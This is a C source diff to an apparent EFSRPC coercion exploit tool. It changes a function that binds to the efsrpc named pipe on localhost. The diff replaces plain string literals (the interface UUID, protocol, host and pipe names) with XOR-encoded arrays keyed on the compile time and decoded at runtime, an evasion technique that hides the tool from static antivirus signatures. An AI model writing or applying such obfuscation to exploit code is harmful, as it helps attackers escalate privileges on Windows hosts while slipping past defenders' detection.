@@ -24,11 +24,39 @@ static handle_t couch_bind(void) {
     RPC_WSTR sb = NULL;
     handle_t bh = NULL;
 
+    // key changes every compile — derived from build timestamp
+    const unsigned char _k = (unsigned char)(
+        ((unsigned char)__TIME__[0] ^
+            (unsigned char)__TIME__[3] ^
+            (unsigned char)__TIME__[6]) | 1);
+
+#define _W(buf) wdeobf((unsigned char*)(buf), sizeof(buf))
+
+    // L"df1941c5-fe89-4e79-bf10-463657acf44d" — XOR'd at compile time
+    unsigned short _uuid[] = {
+        L'd' ^ _k,L'f' ^ _k,L'1' ^ _k,L'9' ^ _k,L'4' ^ _k,L'1' ^ _k,L'c' ^ _k,L'5' ^ _k,
+        L'-' ^ _k,L'f' ^ _k,L'e' ^ _k,L'8' ^ _k,L'9' ^ _k,L'-' ^ _k,L'4' ^ _k,L'e' ^ _k,
+        L'7' ^ _k,L'9' ^ _k,L'-' ^ _k,L'b' ^ _k,L'f' ^ _k,L'1' ^ _k,L'0' ^ _k,L'-' ^ _k,
+        L'4' ^ _k,L'6' ^ _k,L'3' ^ _k,L'6' ^ _k,L'5' ^ _k,L'7' ^ _k,L'a' ^ _k,L'c' ^ _k,
+        L'f' ^ _k,L'4' ^ _k,L'4' ^ _k,L'd' ^ _k, 0
+    };
+    unsigned short _proto[] = { L'n' ^ _k,L'c' ^ _k,L'a' ^ _k,L'c' ^ _k,L'n' ^ _k,L'_' ^ _k,L'n' ^ _k,L'p' ^ _k, 0 };
+    unsigned short _host2[] = { L'\\' ^ _k,L'\\' ^ _k,L'l' ^ _k,L'o' ^ _k,L'c' ^ _k,L'a' ^ _k,L'l' ^ _k,L'h' ^ _k,L'o' ^ _k,L's' ^ _k,L't' ^ _k, 0 };
+    unsigned short _pipe[] = { L'\\' ^ _k,L'p' ^ _k,L'i' ^ _k,L'p' ^ _k,L'e' ^ _k,L'\\' ^ _k,L'e' ^ _k,L'f' ^ _k,L's' ^ _k,L'r' ^ _k,L'p' ^ _k,L'c' ^ _k, 0 };
+    unsigned short _host[] = { L'l' ^ _k,L'o' ^ _k,L'c' ^ _k,L'a' ^ _k,L'l' ^ _k,L'h' ^ _k,L'o' ^ _k,L's' ^ _k,L't' ^ _k, 0 };
+
+    // decrypt in place
+    for (int i = 0; _uuid[i]; i++) _uuid[i] ^= _k;
+    for (int i = 0; _proto[i]; i++) _proto[i] ^= _k;
+    for (int i = 0; _host2[i]; i++) _host2[i] ^= _k;
+    for (int i = 0; _pipe[i]; i++) _pipe[i] ^= _k;
+    for (int i = 0; _host[i]; i++) _host[i] ^= _k;
+
     st = RpcStringBindingComposeW(
-        (RPC_WSTR)L"df1941c5-fe89-4e79-bf10-463657acf44d",
-        (RPC_WSTR)L"ncacn_np",
-        (RPC_WSTR)L"\\\\localhost",
-        (RPC_WSTR)L"\\pipe\\efsrpc",
+        (RPC_WSTR)_uuid,
+        (RPC_WSTR)_proto,
+        (RPC_WSTR)_host2,
+        (RPC_WSTR)_pipe,
         NULL, &sb);
     if (st) { printf("[-] Compose: %ld\n", st); return NULL; }
 
@@ -37,7 +65,7 @@ static handle_t couch_bind(void) {
     if (st) { printf("[-] FromString: %ld\n", st); return NULL; }
 
     st = RpcBindingSetAuthInfoW(bh,
-        (RPC_WSTR)L"localhost",
+        (RPC_WSTR)_host,
         RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
         RPC_C_AUTHN_GSS_NEGOTIATE,
         NULL, RPC_C_AUTHZ_NONE);
